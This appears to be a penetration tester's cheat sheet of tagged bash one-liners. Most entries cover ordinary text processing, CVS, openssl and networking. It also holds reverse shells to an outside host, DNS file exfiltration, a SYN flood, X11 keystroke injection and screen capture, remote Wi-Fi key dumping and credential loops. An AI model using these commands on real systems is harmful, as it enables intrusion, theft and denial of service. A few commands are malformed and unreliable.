### 1. Use only the lines that match a given RegEX [TERM]
```
awk /^[TERM]/ '{print "See the",$1,"at the",$3}' words.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 2. Calculations using AWK. AWK is a huge language, not just for printing columns
```
awk '{print "Avg for",$1,"is",($2+$3+$4)/3}' grades.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 3. Print first and last lines of a file
```
awk 'NR==1;END{print}' file.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 4. Split the file on ; instead of space
```
awk -F ";" '{print $2}' file.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 5. Print a portion of the text
```
awk '/start_pattern/,/stop_pattern/' file.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 6. diff file in cvs
```
cvs diff <file>
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 7. show history of files
```
cvs log <file>
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 8. roll back cvs change
```
file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m "Reverted to previous version" $file
```
**- linux,bash,loop**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 9. find broken symlinks
```
find -L . -type l
```
**- linux,bash**
#### References:

https://www.cyberciti.biz/faq/linux-unix-find-files-with-symbolic-links/
__________
### 10. Hijack screen
```
screen -D -R [ID]
```
**- linux,bash**
#### References:

https://www.cyberciti.biz/tips/linux-screen-command-howto.html
__________
### 11. Forward the remote port to the local machine
```
ssh -R [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 12. Forward the local port to the remote machine
```
ssh -L [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 13. 1Gig of zeros
```
dd if=/dev/zero of=1g.img count=1M bs=1K
```
**- linux,bash,files**
#### References:

https://www.cyberciti.biz/faq/linux-unix-dd-command-show-progress-while-coping/
__________
### 14. get password policy for root
```
chage -l root
```
**- linux,bash,passwords,enumeration,user information**
#### References:

http://www.thegeekstuff.com/2009/04/chage-linux-password-expiration-and-aging/
__________
### 15. Display system clock in terminal top right corner! :-)
```
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
```
**- linux,bash,loop,interesting**
#### References:

http://www.computerhope.com/unix/utput.htm
__________
### 16. icmp ping
```
hping3 -1 [ip]
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 17. syn scan port range with hping
```
hping3 -8 [port]-[port] -S [ip] -V
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 18. ACK scan on port
```
hping3 -A [ip] -p [port]
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 19. udp port scan
```
hping3 -2 [ip] -p [port ]
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
https://www.cyberciti.biz/tips/howto-linux-iptables-bypass-firewall-restriction.html
__________
### 20. Get initial sequence number
```
hping3 -Q [ip] -p [port] -s
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 21. get remote timestamp
```
hping3 -S [ip] -p [port] --tcp-timestamp
```
**- linux,bash,networking,enumeration**
#### References:

http://wiki.hping.org/
__________
### 22. Xmas' scan
```
hping3 -F -p -U [ip] -p [port]
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 23. Sweep range for up hosts ie 192.168.1.x
```
hping3 -1 [ip].x --rand-dest -I em1
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 24. Intercept all http
```
hping3 -9 HTTP -I em1
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 25. Syn flood victim
```
hping3 -S [victim] -a [gw] -p [port] --flood
```
**- linux,bash,networking,interesting**
#### References:

http://wiki.hping.org/
__________
### 26. get google
```
GET //google.com
```
**- linux,bash**
#### References:

https://www.lifewire.com/get-linux-command-4093526
__________
### 27. bash if
```
if [ $carprice -gt 20000]; then echo "too much"; else echo "ok"; fi
```
**- linux,bash**
#### References:

http://www.thegeekstuff.com/2010/06/bash-conditional-expression
https://bash.cyberciti.biz/guide/If..else..fi
__________
### 28. # Verify the certificate / private key association
```
openssl x509 -noout -modulus -in [CERT] | openssl md5
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
__________
### 29. https://www.sslshopper.com/article-most-common-openssl-commands.html
```
openssl x509 -in certificate.crt -text
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
__________
### 30. Grab the hostname in the certificate
```
echo "" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed 's/^.*CN=//'
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
__________
### 31. Change MAC address
```
ifconfig eth0 hw ether 00:E0:81:5C:B4:0F
```
**- linux,bash,networking,stealth**
#### References:

https://www.cyberciti.biz/faq/linux-change-ip-address/
__________
### 32. How will the sytem route traffic to [IP]
```
ip route show to match [IP]
```
**- linux,bash,networking**
#### References:

http://baturin.org/docs/iproute2/
__________
### 33. Depricated way of showing routing table, please see the ip command
```
route -n
```
**- linux,bash,networking**
#### References:

http://baturin.org/docs/iproute2/
__________
### 34. Curl through a proxy (-m = timeout)
```
curl -D - --proxy1.0 [ip]:80 -m 2 [url]
```
**- linux,bash,web application**
#### References:

http://www.thegeekstuff.com/2012/04/curl-examples/
__________
### 35. Curl with cookie
```
curl -k --cookie "[cookie]" [url] --silent | grep "<title>"
```
**- linux,bash,web application**
#### References:

http://www.thegeekstuff.com/2012/04/curl-examples/
__________
### 36. Null session smb
```
smbclient -I [IP] -L [domain] -N -U ""
```
**- linux,bash,smb**
#### References:

https://www.cyberciti.biz/faq/access-windows-shares-from-linux/
https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
__________
### 37. Default community string in SNMP
```
snmpwalk -v 1 -c public [TARGET]
```
**- linux,bash,scanning,brute**
#### References:

http://net-snmp.sourceforge.net/docs/man/snmpwalk.html
__________
### 38. recover file after being deleted
```
lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4
```
**- linux,bash,interesting**
#### References:

https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html
__________
### 39. list installed programs
```
rpm -qa | less
```
**- linux,bash,package management**
#### References:

https://www.linux.com/blog/rpm-commands
__________
### 40. remove 4 chars
```
echo "hello fredrick" | sed 's/.\{4\}$//'
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 41. add space after each line
```
cat db.schema | sed G
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 42. convert a list into a multi line CSV
```
sed 's/ *$//;s/$/;/' linkedin.txt | paste - - - - | tr -d '\t'
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 43. # Add to the beginning of the line starting with a pattern
```
sed -i '/^[0-9]/ s/^/sshd: /' /etc/hosts.allow
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 44. bash reverse shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 45. Fix nano <3 ;)
```
# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano
```
**- bash,text manipulation,files,interesting**
#### References:

https://xkcd.com/378/
__________
### 46. not ls
```
sl
```
**- linux,bash,interesting**
#### References:

https://www.cyberciti.biz/tips/displays-animations-when-accidentally-you-type-sl-instead-of-ls.html
__________
### 47. Abuse open x11 : Think open term add user add key ;)
```
command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter
```
**- linux,bash,interesting**
#### References:

https://necurity.co.uk
https://ubuntuforums.org/archive/index.php/t-1970619.html
__________
### 48. Burpify JSON request
```
cat json.txt | sed "s/false/§false§/g" | sed "s/true/§true§/g" | sed "s/null/§null§/g" | sed "s/:\"/:\"§/g" | sed "s/\",/§\",/g" | sed "s/\"}/§\"}/g" | sed "s/\\[\\]/\\[§§\\]/g"
```
**- bash,text manipulation,interesting,web application**
#### References:

https://www.yg.ht/
__________
### 49. loop to find user shares
```
for host in $(cat ../nmap/[IP File]); do echo "Trying $host"; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done
```
**- linux,bash,loop,enumeration,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
https://yg.ht
__________
### 50. turn loop for local admins into csv
```
egrep -v "(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)" local_admin_information | egrep -v "(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)" | grep -v "Alias name" | grep -v "Administrators have complete" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v "^$" | sed s/"\[\*\] Creating service.*on"/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/"^ "/"€"/g | sed s/'The command completed successfully.'/€/g | tr "\n" "," | tr € "\n" | grep -v "^$" | sort | uniq  > local_admins.csv
```
**- linux,bash,text manipulation,loop,user information,interesting**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 51. Scheduled cmd to run
```
at [TIME] command.exe /s cmd SYSCMD
```
**- linux,bash,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490866.aspx
https://www.lifewire.com/linux-command-at-4091646
__________
### 52. Create Self-signed cert / key
```
name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts
```
**- linux,bash,certificates**
#### References:

https://yg.ht
https://www.sslshopper.com/article-how-to-create-a-self-signed-certificate.html
__________
### 53. loop dump wifi keys
```
for host in $(cat localsubnet.txt); do echo "Trying $host"; winexe --user [Domain]/[user]%[pass] //$host "netsh wlan export profile name=[PROFILE] key=clear"; done
```
**- bash,loop,passwords,enumeration,wireless,wifi**
#### References:

https://yg.ht
https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 54. Temporary IP
```
ifconfig eth0 192.168.0.x/24
```
**- linux,bash,networking,stealth**
#### References:

https://www.cyberciti.biz/faq/linux-change-ip-address/
__________
### 55. text in binaries
```
strings [FILENAME] --bytes=2 |grep "^sa$" -A 4
```
**- linux,bash,files**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 56. Check for vlans that you can hop to : may need to change the grep for interfaces
```
frogger.sh
```
**- bash,networking,scanning**
#### References:

https://github.com/nccgroup/vlan-hopping---frogger
__________
### 57. manual vlans
```
vconfig add em1 [VLANID]
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/tips/howto-configure-linux-virtual-local-area-network-vlan.html
__________
### 58. dhcp client
```
dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 59. dhcp lease rpm
```
cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`
```
**- linux,bash,networking**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 60. dhcp lease deb
```
cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`
```
**- linux,bash,networking**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 61. dhcp lease
```
ls -lt /var/lib/NetworkManager/
```
**- linux,bash,networking**
#### References:

https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 62. route table add
```
route add -net [CIDR] gw [IP] [INTERFACE]
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
__________
### 63. route table del
```
route del -net 0.0.0.0 gw [GW] eth1
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
__________
### 64. Encrypted zip
```
7z a -p -mem=AES report.zip [INPUT FILE]
```
**- linux,bash,files**
#### References:

https://yg.ht
https://www.cyberciti.biz/tips/how-can-i-zipping-and-unzipping-files-under-linux.html
__________
### 65. cvs check out repo
```
cvs checkout [package name]
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 66. cvs update local repo
```
cvs update -d .
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 67. cvs add a new file
```
cvs add [File inc "package"]
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 68. cvs delete file
```
cvs release [package or file in package]
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 69. sslscan cert checks
```
openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk '$0=="-----BEGIN CERTIFICATE-----" {p=1}; p; $0=="-----END CERTIFICATE-----" {p=0}' (this pulls just the certificates for each in the chain)
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
__________
### 70. sslscan cert checks
```
openssl x509 -noout -text | grep -i "signature algorithm\|before\|after\|issuer\|subject:" (split the above commands output and stick in here, then manually analyse)
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
__________
### 71. nmap devicemap
```
grep "Discovered open port" nmap-udp-scan.txt | sed "s/\// /g" | sed "s/ /\t/g" | awk -F "\t" {'print $7"\t"$5"\t"$4"\topen"'} > devicemap-udp.tsv
```
**- linux,bash,text manipulation,networking**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 72. nmap service discovery
```
for file in $( ls -lash | grep ".gnmap" | awk {'print $10'} ); do cat $file | grep "Ports" | grep "open" | awk {'print $2'} | sort -u > IPs-`echo $file | cut -d "-" -f 2 | cut -d "." -f 1;`.txt; done
```
**- bash,text manipulation,loop**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 73. nmap service discovery
```
cat nmapScan-[SERVICE].gnmap | grep "Ports" | grep "open" | grep -v "open|filtered" | awk {'print $2'} | sort -u > IPs-[SERVICE].txt
```
**- linux,bash,text manipulation**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 74. Convert a user list in format "first last" to flast
```
cat users | awk '{print substr ($0, 1, 1),$2}' | tr [A-Z] [a-z] | sort | uniq
```
**- linux,bash,enumeration,user information,recon**
#### References:

https://necurity.co.uk
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 75. bash reverse shell using a file handle '5'
```
exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 76. telnet reverse shell
```
rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 77. telnet reverse shell
```
telnet [me] [port]| /bin/bash | telnet [me] [lport]
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 78. list network connections
```
netstat -tulpen
```
**- linux,bash,networking**
#### References:

https://www.cyberciti.biz/tips/tag/netstat-command
__________
### 79. print vpn keys
```
ip xfrm state list
```
**- linux,bash,networking,passwords**
#### References:

https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/
__________
### 80. enable ip forwarding in the kernel temporarily
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
**- linux,bash,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/rhel-centos-fedora-linux-ip-forwarding-tutorial/
__________
### 81. Spawn a cmd in a gui window
```
xterm -bg black -title "TryH4rD3r" -e "ls -la;read"
```
**- linux,bash,interesting**
#### References:

http://invisible-island.net/xterm/
__________
### 82. take a screenshot from a open X11 and convert it to a jpg
```
xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg
```
**- linux,bash,pivoting,scanning**
#### References:

http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-display
__________
### 83. exfil file through DNS, may want to encrypt, also assuming you have a short domain
```
for line in `base64 -w 62 [file]`; do host $line.[hostname]; done
```
**- linux,bash,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 84. tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
```
for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
```
**- linux,bash,networking,loop,interesting,scanning**
#### References:

http://tldp.org/LDP/abs/html/devref1.html
__________
### 85. Pretty terminal PS1 that is copy n paste safe
```
export PS1="# \A:\[$(tput sgr0)\]\[\033[38;5;1m\]\u:\W:\[$(tput sgr0)\] "
```
**- linux,bash**
#### References:

http://bashrcgenerator.com/
__________
### 86. Remove trailing whitespace
```
sed -i 's/[[:space:]]*$//' [input]
```
**- linux,bash,text manipulation**
#### References:

http://ask.xmodulo.com/remove-trailing-whitespaces-linux.html
__________
### 87. Create a SSH based TAP VPN
```
ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C 'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1;
```
**- linux,bash,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 88. OpenSSL Encypt, add -a if input is b64, 
```
openssl aes-256-cbc -in some_file.enc -out some_file.unenc -e -pass pass:somepassword
```
**- linux,bash,encryption**
#### References:

http://tombuntu.com/index.php/2007/12/12/simple-file-encryption-with-openssl/
__________
### 89. OpenSSL decrypt, add -a if input is b64, 
```
openssl aes-256-cbc -in some_file.enc -out some_file.unenc -d -pass pass:somepassword
```
**- linux,bash,encryption**
#### References:

http://tombuntu.com/index.php/2007/12/12/simple-file-encryption-with-openssl/
__________
### 90. Most used Terminal commands
```
history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
```
**- linux,bash,interesting**
#### References:

http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
__________
### 91. Take the active users output and create filled in CMD's, course it can be anything, not just TSQL
```
for i in `cat ../clean_creds`; do echo $i | awk -F : '{print "tsql -S [IP] -p 1433 -U [domain]\\\\"$2" -P "$3}'; done
```
**- bash,loop,scanning**
#### References:

https://www.cyberciti.biz/faq/bash-for-loop/
__________
### 92. Project your mic to remote hosts speakers
```
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
```
**- linux,bash,interesting**
#### References:

http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
__________
